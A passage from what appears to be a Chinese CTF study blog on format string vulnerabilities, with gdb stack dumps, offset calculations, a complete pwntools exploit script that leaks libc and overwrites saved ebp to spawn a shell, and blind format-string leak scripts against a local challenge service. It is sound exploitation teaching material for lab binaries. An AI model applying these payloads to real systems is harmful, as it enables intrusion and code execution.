<h4 id="获取相关地址与偏移"><a href="#获取相关地址与偏移" class="headerlink" title="获取相关地址与偏移"></a>获取相关地址与偏移</h4><p>这里我们主要是获取 system 函数地址、/bin/sh 地址，栈上存储联系人描述的地址，以及 PrintInfo 函数的地址。</p>
<p>首先，我们根据栈上存储的 libc_start_main_ret 地址 (该地址是当 main 函数执行返回时会运行的函数) 来获取 system 函数地址、/bin/sh 地址。我们构造相应的联系人，然后选择输出联系人信息，并将断点下在 printf 处，并且一直运行到格式化字符串漏洞的 printf 函数处，如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret    </span><br><span class="line">      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret    </span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]</span><br><span class="line">8</span><br><span class="line">0xffffccfc│+0x00: 0x08048c27  →   leave      ← $esp</span><br><span class="line">0xffffcd00│+0x04: 0x0804c420  →  &quot;1234567&quot;</span><br><span class="line">0xffffcd04│+0x08: 0x0804c410  →  &quot;11111&quot;</span><br><span class="line">0xffffcd08│+0x0c: 0xf7e5acab  →  &lt;puts+11&gt; add ebx, 0x152355</span><br><span class="line">0xffffcd0c│+0x10: 0x00000000</span><br><span class="line">0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← $ebp</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line"><span class="meta">[#</span><span class="bash">0] 0xf7e44670 → Name: __printf(format=0x804c420 <span class="string">&quot;1234567\n&quot;</span>)</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">1] 0x8048c27 → leave</span> </span><br><span class="line"><span class="meta">[#</span><span class="bash">2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">3] 0x80487a2 → jmp 0x80487b3</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 &lt;_dl_fini&gt;, stack_end=0xffffce0c)</span></span><br><span class="line"><span class="meta">[#</span><span class="bash">5] 0x80485e1 → hlt</span> </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  dereference $esp 140</span><br><span class="line">[&#x27;$esp&#x27;, &#x27;140&#x27;]</span><br><span class="line">1</span><br><span class="line">0xffffccfc│+0x00: 0x08048c27  →   leave      ← $esp</span><br><span class="line">gef➤  dereference $esp l140</span><br><span class="line">[&#x27;$esp&#x27;, &#x27;l140&#x27;]</span><br><span class="line">140</span><br><span class="line">0xffffccfc│+0x00: 0x08048c27  →   leave      ← $esp</span><br><span class="line">0xffffcd00│+0x04: 0x0804c420  →  &quot;1234567&quot;</span><br><span class="line">0xffffcd04│+0x08: 0x0804c410  →  &quot;11111&quot;</span><br><span class="line">0xffffcd08│+0x0c: 0xf7e5acab  →  &lt;puts+11&gt; add ebx, 0x152355</span><br><span class="line">0xffffcd0c│+0x10: 0x00000000</span><br><span class="line">0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← $ebp</span><br><span class="line">0xffffcd1c│+0x20: 0x08048c99  →   add DWORD PTR [ebp-0xc], 0x1</span><br><span class="line">0xffffcd20│+0x24: 0x0804b0a8  →  &quot;11111&quot;</span><br><span class="line">0xffffcd24│+0x28: 0x00002b67 (&quot;g+&quot;?)</span><br><span class="line">0xffffcd28│+0x2c: 0x0804c410  →  &quot;11111&quot;</span><br><span class="line">0xffffcd2c│+0x30: 0x0804c420  →  &quot;1234567&quot;</span><br><span class="line">0xffffcd30│+0x34: 0xf7fadd60  →  0xfbad2887</span><br><span class="line">0xffffcd34│+0x38: 0x08048ed6  →  0x25007325 (&quot;%s&quot;?)</span><br><span class="line">0xffffcd38│+0x3c: 0x0804b0a0  →  0x0804c420  →  &quot;1234567&quot;</span><br><span class="line">0xffffcd3c│+0x40: 0x00000000</span><br><span class="line">0xffffcd40│+0x44: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd44│+0x48: 0x00000000</span><br><span class="line">0xffffcd48│+0x4c: 0xffffcd78  →  0x00000000</span><br><span class="line">0xffffcd4c│+0x50: 0x080487a2  →   jmp 0x80487b3</span><br><span class="line">0xffffcd50│+0x54: 0x0804b0a0  →  0x0804c420  →  &quot;1234567&quot;</span><br><span class="line">0xffffcd54│+0x58: 0xffffcd68  →  0x00000004</span><br><span class="line">0xffffcd58│+0x5c: 0x00000050 (&quot;P&quot;?)</span><br><span class="line">0xffffcd5c│+0x60: 0x00000000</span><br><span class="line">0xffffcd60│+0x64: 0xf7fad3dc  →  0xf7fae1e0  →  0x00000000</span><br><span class="line">0xffffcd64│+0x68: 0x08048288  →  0x00000082</span><br><span class="line">0xffffcd68│+0x6c: 0x00000004</span><br><span class="line">0xffffcd6c│+0x70: 0x0000000a</span><br><span class="line">0xffffcd70│+0x74: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd74│+0x78: 0xf7fad000  →  0x001b1db0</span><br><span class="line">0xffffcd78│+0x7c: 0x00000000</span><br><span class="line">0xffffcd7c│+0x80: 0xf7e13637  →  &lt;__libc_start_main+247&gt; add esp, 0x10</span><br><span class="line">0xffffcd80│+0x84: 0x00000001</span><br><span class="line">0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  &quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]&quot;</span><br><span class="line">0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;</span><br></pre></td></tr></table></figure>

<p>我们可以通过简单的判断可以得到</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffcd7c│+0x80: 0xf7e13637  →  &lt;__libc_start_main+247&gt; add esp, 0x10</span><br></pre></td></tr></table></figure>

<p>存储的是 __libc_start_main 的返回地址，同时利用 fmtarg 来获取对应的偏移，可以看出其偏移为 32，那么相对于格式化字符串的偏移为 31（格式化字符串在 0xffffcd00 ）。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  fmtarg 0xffffcd7c</span><br><span class="line">The index of format argument : 32</span><br></pre></td></tr></table></figure>

<p>这样我们便可以得到对应的地址了。进而可以根据 libc-database 来获取对应的 libc，继而获取 system 函数地址与 /bin/sh 函数地址了。</p>
<p>其次，我们可以确定栈上存储格式化字符串的地址 0xffffcd2c 相对于格式化字符串的偏移为 11，得到这个是为了寻址堆中指定联系人的 Description 的内存首地址，我们将格式化字符串 [system_addr][bbbb][binsh_addr][%6p][p][p][bbbb] 保存在指定联系人的 Description 中。</p>
<p>再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为 6，这样我们可以直接修改上层函数存储的 ebp 的值。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← $ebp</span><br></pre></td></tr></table></figure>

<h4 id="构造联系人获取堆地址"><a href="#构造联系人获取堆地址" class="headerlink" title="构造联系人获取堆地址"></a>构造联系人获取堆地址</h4><p>得知上面的信息后，我们可以利用下面的方式获取堆地址与相应的 ebp 地址。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[system_addr][bbbb][binsh_addr][%</span><span class="bash">6<span class="variable">$p</span>][%11<span class="variable">$p</span>][bbbb]</span></span><br></pre></td></tr></table></figure>

<p>来获取对应的相应的地址。后面的 bbbb 是为了接受字符串方便。</p>
<p>这里因为函数调用时所申请的栈空间与释放的空间是一致的，所以我们得到的 ebp 地址并不会因为我们再次调用而改变。</p>
<p><strong>注解</strong>：</p>
<p>因为 PrintInfo 肯定是通过 main 函数调用的，而 main 函数一直没有结束，也就是一直在内存的某一固定位置。PrintInfo 是在 main 栈基础上往低地址生长的，所以只有 PrintInfo 结构固定 ebp 地址也不会因为我们再次调用而改变。PrintInfo 结构固定是因为所有输出内容（号码、描述等）都是以堆堆指针形式存储的，也就是无论长度如何变化在栈上所在空间都是不变的，ebp 的偏移也就是固定了。</p>
<p>在部分环境下，system 地址会出现 \ x00，导致 printf 的时候出现 0 截断导致无法泄露两个地址，因此可以将 payload 的修改如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[%</span><span class="bash">6<span class="variable">$p</span>][%11<span class="variable">$p</span>][ccc][system_addr][bbbb][binsh_addr][dddd]</span></span><br></pre></td></tr></table></figure>

<p>payload 修改为这样的话，还需要在 heap 上加入 12 的偏移。这样保证了 0 截断出现在泄露之后。<code>[%6$p]</code>：上层函数 ebp 地址；<code>[%11$p]</code>：堆块 fd 指针地址；</p>
<h4 id="修改-ebp"><a href="#修改-ebp" class="headerlink" title="修改 ebp"></a>修改 ebp</h4><p>由于我们需要执行 leave（ <del>move 指令将 ebp 赋给 esp，并还需要执行 pop ebp</del> ）才会执行 ret 指令，所以我们需要将 ebp 修改为存储 system 地址 -4 的值。这样 <code>move esp,ebp</code> 之后，esp 恰好指向保存 system 的地址，这时在执行 ret 指令即可执行 system 函数。</p>
<p>上面已经得知了我们希望修改的 ebp 值，而也知道了对应的偏移为 6，所以我们可以构造如下的 payload 来进行修改相应的值。(这里是 wiki 的修改方法，因为wiki exp 我本地打不通，换成自己的，所以修改方法也不一样)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">part1 = (heap_addr - <span class="number">4</span>) / <span class="number">2</span></span><br><span class="line">part2 = heap_addr - <span class="number">4</span> - part1</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(part1) + <span class="string">&#x27;x%&#x27;</span> + <span class="built_in">str</span>(part2) + <span class="string">&#x27;x%6$n&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h4><p>这时，执行完格式化字符串函数之后，退出到上上函数，我们输入 5 ，退出程序即会执行 ret 指令，就可以获取 shell。</p>
<h4 id="利用程序-2"><a href="#利用程序-2" class="headerlink" title="利用程序"></a>利用程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : contacts.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./contacts&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./contacts&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># 使用题目提供的libc</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat</span>(<span class="params">name,number,length,description</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Name: &quot;</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;No: &quot;</span>,number)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;description: &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;description:\n&quot;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">name</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;remove? &quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">name,choose,newname=<span class="string">&#x27;skye&#x27;</span>,length=<span class="number">10</span>,description=<span class="string">&#x27;skye&#x27;</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;change? &quot;</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(choose))</span><br><span class="line">	<span class="keyword">if</span>(choose==<span class="number">1</span>):</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;name: &quot;</span>,newname)</span><br><span class="line">	<span class="keyword">elif</span>(choose==<span class="number">2</span>):</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;description: &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;Description: \n&quot;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">creat(<span class="string">&quot;skye&quot;</span>,<span class="string">&quot;skye&quot;</span>,<span class="number">24</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">&quot;%31$p&quot;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_start_main:&quot;</span>+<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc_base = libc_start_main - <span class="number">0x18637</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr:&quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak ebp&amp;heap addr</span></span><br><span class="line"><span class="comment"># 将system前置可能会遇到\x00阻断，可自行后置，并调整ebp覆盖值</span></span><br><span class="line">payload = p32(system_addr) + <span class="string">&#x27;bbbb&#x27;</span> + p32(binsh_addr) + <span class="string">&#x27;%6$p%11$pcccc&#x27;</span></span><br><span class="line">creat(<span class="string">&#x27;2222&#x27;</span>, <span class="string">&#x27;skye&#x27;</span>, <span class="number">0x20</span>, payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">&#x27;cccc&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">data = data.split(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">ebp_addr = <span class="built_in">int</span>(data[-<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;ebp_addr:&quot;</span>+<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">heap_addr = <span class="built_in">int</span>(data[-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite main_ebp</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%6$n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(heap_addr-<span class="number">4</span>))</span><br><span class="line">creat(<span class="string">&#x27;3333&#x27;</span>, <span class="string">&#x27;skye&#x27;</span>, <span class="number">68</span>, payload)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x0804876A&#x27;)</span></span><br><span class="line"><span class="comment">#raw_input(&#x27;pause&#x27;)</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>需要注意的是，这样并不能稳定得到 shell，因为我们一次性输入了太长的字符串。但是我们又没有办法在前面控制所想要输入的地址。只能这样了。</p>
<p>为什么需要打印这么多呢？因为格式化字符串不在栈上，所以就算我们得到了需要更改的 ebp 的地址，也没有办法去把这个地址写到栈上，利用 $ 符号去定位他；因为没有办法定位，所以没有办法用 hn\hhn 等方式去写这个地址，只能用 n 方式去写，所以打印很多。</p>
<p><strong>注解</strong>：</p>
<p>我的脚本中用的不是 <code>system(&#39;/bin/sh&#39;)</code> ，而是 <code>system(&#39;sh&#39;)</code> ，这是因为用题目提供的 libc 搜索 /bin/sh 得到结果有误，得到的地址不是 /bin/sh ：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="_images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/fmrstr_5.png" alt="fmrstr_5.png"></p>
<p>而去到 libcdatabase 得到结果是：<code>0xf7f60a0b</code>，里面有一个 0x0a 就是换行符嘛，这样会提前终止输入，所以也不行。最后使用题目提供 libc 搜索 sh ，成功 getshell 。</p>
<p>在我的环境（Ubuntu 16.04）没有遇到 system \x00 阻断，所以 payload 中 system 前置。如果遇到阻断，就将 system 后置，并调整 ebp 覆盖内容加上偏移即可。</p>
<h2 id="格式化字符串盲打"><a href="#格式化字符串盲打" class="headerlink" title="格式化字符串盲打"></a>格式化字符串盲打</h2><blockquote>
<p>ctf-wiki 上格式化字符串介绍不是很全面，我查了其他大佬的笔记，自己总结了：<a href="Bilnd_Pwn.md">Bilnd-格式化字符串盲打</a></p>
</blockquote>
<h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>所谓格式化字符串盲打指的是只给出可交互的 ip 地址与端口，不给出对应的 binary 文件来让我们进行 pwn，其实这个和 BROP 差不多，不过 BROP 利用的是栈溢出，而这里我们利用的是格式化字符串漏洞。一般来说，我们按照如下步骤进行</p>
<ul>
<li>确定程序的位数</li>
<li>确定漏洞位置</li>
<li>利用</li>
</ul>
<p>由于没找到比赛后给源码的题目，所以自己简单构造了两道题。</p>
<h3 id="例子-1-泄露栈"><a href="#例子-1-泄露栈" class="headerlink" title="例子 1 - 泄露栈"></a>例子 1 - 泄露栈</h3><p>源码和部署文件均放在了对应的文件夹 <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack">fmt_blind_stack</a> 中。</p>
<h4 id="确定程序位数"><a href="#确定程序位数" class="headerlink" title="确定程序位数"></a>确定程序位数</h4><p>我们随便输入了 %p，程序回显如下信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  blind_fmt_stack git:(master) ✗ nc localhost 9999</span><br><span class="line"><span class="meta">%</span><span class="bash">p</span></span><br><span class="line">0x7ffd4799beb0</span><br><span class="line">G�flag is on the stack%                          </span><br></pre></td></tr></table></figure>

<p>告诉我们 flag 在栈上，同时知道了该程序是 64 位的，而且应该有格式化字符串漏洞。</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>那我们就一点一点测试看看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">payload</span>):</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    data = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">&#x27;0x&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span> p64(<span class="built_in">int</span>(data, <span class="number">16</span>))</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    payload = <span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    leak(payload)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>最后在输出中简单看了看，得到 flag</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">////////</span><br><span class="line">////////</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\xff</span><br><span class="line">flag&#123;thi</span><br><span class="line">s_is_fla</span><br><span class="line">g&#125;\x00\x00\x00\x00\x00\x00</span><br><span class="line">\x00\x00\x00\x00\xfe\x7f\x00\x00</span><br></pre></td></tr></table></figure>

<h3 id="例子-2-盲打劫持-got"><a href="#例子-2-盲打劫持-got" class="headerlink" title="例子 2 - 盲打劫持 got"></a>例子 2 - 盲打劫持 got</h3><p>源码以及部署文件均已经在 <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_got">blind_fmt_got</a> 文件夹中。</p>
<h4 id="确定程序位数-1"><a href="#确定程序位数-1" class="headerlink" title="确定程序位数"></a>确定程序位数</h4><p>通过简单地测试，我们发现这个程序是格式化字符串漏洞函数，并且程序为 64 位。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  blind_fmt_got git:(master) ✗ nc localhost 9999</span><br><span class="line"><span class="meta">%</span><span class="bash">p</span></span><br><span class="line">0x7fff3b9774c0</span><br></pre></td></tr></table></figure>

<p>这次啥也没有回显，又试了试，发现也没啥情况，那我们就只好来泄露一波源程序了。</p>
<h4 id="确定偏移-1"><a href="#确定偏移-1" class="headerlink" title="确定偏移"></a>确定偏移</h4><p>在泄露程序之前，我们还是得确定一下格式化字符串的偏移，如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  blind_fmt_got git:(master) ✗ nc localhost 9999</span><br><span class="line"><span class="meta">aaaaaaaa%</span><span class="bash">p%p%p%p%p%p%p%p%p</span></span><br><span class="line">aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025</span><br></pre></td></tr></table></figure>

<p>据此，我们可以知道格式化字符串的起始地址偏移为 6。</p>
<h4 id="泄露-binary"><a href="#泄露-binary" class="headerlink" title="泄露 binary"></a>泄露 binary</h4><p>由于程序是 64 位，所以我们从 0x400000 处开始泄露。一般来说有格式化字符串漏洞的盲打都是可以读入 ‘\x00’ 字符的，不然没法泄露怎么玩，，除此之后，输出必然是 ‘\x00’ 截断的，这是因为格式化字符串漏洞利用的输出函数均是 ‘\x00’ 截断的，所以我们可以利用如下的泄露代码。</p>
